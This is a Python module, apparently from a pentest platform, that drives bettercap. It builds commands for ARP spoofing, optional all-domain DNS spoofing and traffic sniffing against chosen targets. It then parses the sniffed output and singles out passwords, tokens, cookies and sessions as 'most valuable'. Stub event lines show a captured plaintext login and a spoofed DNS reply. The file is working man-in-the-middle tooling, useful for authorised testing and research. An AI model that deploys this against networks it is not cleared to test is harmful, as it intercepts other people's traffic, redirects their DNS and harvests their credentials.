"""bettercap wrapper — build the caplet/argv and parse the event stream.

bettercap is driven non-interactively with ``-eval "<commands>"``: we enable
host probing, point ``arp.spoof`` at the chosen target(s), optionally turn on
``dns.spoof``, and start ``net.sniff`` + ``events.stream`` so its findings
print to stdout. The service reads that stdout line by line and feeds each
line through :func:`parse_event_line`, which strips ANSI colour and buckets
the line into dns / http / cred / info.

bettercap requires root (raw sockets); the platform already runs as root.
Stub mode (Mac dev) never launches it — the service replays
``STUB_EVENT_LINES`` instead.
"""

from __future__ import annotations

import re
from typing import Any

from app.tools._common import run, stub_mode

# Strip ANSI colour codes bettercap emits so our regexes match clean text.
_ANSI = re.compile(r"\x1b\[[0-9;]*m")
# bettercap log line: "12:00:00 [grp.event] message"
_EVENT = re.compile(r"\[(?P<tag>[a-z0-9_.]+)\]\s*(?P<body>.*)$", re.I)
_CRED_HINT = re.compile(r"\b(pass(word|wd)?|user(name)?|login|auth|token|"
                        r"session|cookie|credential)\b", re.I)


def is_available() -> tuple[bool, str]:
    """Whether the bettercap binary is installed. (ok, version-or-hint)."""
    if stub_mode():
        return True, "stub mode"
    res = run(["bettercap", "-version"], timeout=5, source="bettercap")
    if res.returncode == 127:
        return False, "not installed — run 'sudo apt install bettercap' on the Pi"
    out = (res.stdout or res.stderr or "").strip().splitlines()
    return True, (out[0] if out else "installed")


def build_caplet(targets: str, *, dns_spoof: bool = False,
                 dns_domains: str = "*", dns_redirect_ip: str | None = None,
                 ) -> list[str]:
    """The ordered bettercap commands. ``targets`` is a comma/space list of
    IPs or a CIDR. ``dns_domains`` is bettercap's domain glob (``*`` = all)."""
    cmds = [
        "net.probe on",
        f"set arp.spoof.targets {targets}",
        "set arp.spoof.fullduplex true",
        "arp.spoof on",
        "net.sniff on",
    ]
    if dns_spoof:
        cmds.append(f"set dns.spoof.domains {dns_domains or '*'}")
        if dns_redirect_ip:
            cmds.append(f"set dns.spoof.address {dns_redirect_ip}")
        cmds.append("set dns.spoof.all true")
        cmds.append("dns.spoof on")
    cmds.append("events.stream on")
    return cmds


def build_argv(iface: str, targets: str, *, dns_spoof: bool = False,
               dns_domains: str = "*", dns_redirect_ip: str | None = None,
               ) -> list[str]:
    caplet = build_caplet(targets, dns_spoof=dns_spoof, dns_domains=dns_domains,
                          dns_redirect_ip=dns_redirect_ip)
    # -no-colors keeps stdout clean; -eval runs our caplet then streams events.
    return ["bettercap", "-iface", iface, "-no-colors",
            "-eval", "; ".join(caplet)]


def parse_event_line(raw: str) -> dict[str, Any] | None:
    """Bucket a bettercap stdout line into a structured event, or None if it's
    noise. Returns ``{kind, src, summary, raw}`` where kind ∈
    {dns, http, cred, info}. Approximate by design — bettercap's text varies
    by version, so unmatched-but-interesting lines fall through to 'info'."""
    line = _ANSI.sub("", raw or "").strip()
    if not line:
        return None
    m = _EVENT.search(line)
    tag = (m.group("tag") if m else "").lower()
    body = (m.group("body") if m else line).strip()

    # Credentials first — most valuable, can appear under any sniff tag.
    if "net.sniff" in tag and _CRED_HINT.search(body):
        return {"kind": "cred", "src": _first_ip(body), "summary": body[:200],
                "raw": line}
    if tag.startswith("net.sniff.dns") or tag == "dns.spoof":
        return {"kind": "dns", "src": _first_ip(body),
                "summary": _strip_ip(body)[:200], "raw": line}
    if tag.startswith("net.sniff.http") or tag.startswith("net.sniff.https"):
        return {"kind": "http", "src": _first_ip(body),
                "summary": _strip_ip(body)[:200], "raw": line}
    if tag in ("endpoint.new", "endpoint.lost", "arp.spoof", "sys.log",
               "dns.spoof", "mod.started", "mod.stopped"):
        return {"kind": "info", "src": _first_ip(body),
                "summary": (f"[{tag}] " + body)[:200], "raw": line}
    return None


_IP_RE = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b")


def _first_ip(text: str) -> str | None:
    m = _IP_RE.search(text or "")
    return m.group(1) if m else None


def _strip_ip(text: str) -> str:
    return _IP_RE.sub("", text or "", count=1).strip(" :>-")


# Canned event lines for stub mode (Mac dev) — exercise each bucket.
STUB_EVENT_LINES: list[str] = [
    "12:00:01 [sys.log] [inf] arp.spoof enabling forwarding",
    "12:00:02 [endpoint.new] new endpoint detected 10.0.0.50",
    "12:00:03 [net.sniff.dns] 10.0.0.50 : example-iot.local -> 10.0.0.50",
    "12:00:04 [net.sniff.http.request] 10.0.0.50 GET cam.local/status",
    "12:00:05 [net.sniff.http.request] 10.0.0.50 POST cam.local/login username=admin&password=admin123",
    "12:00:06 [dns.spoof] sending spoofed DNS reply for tracker.example.com to 10.0.0.50",
]
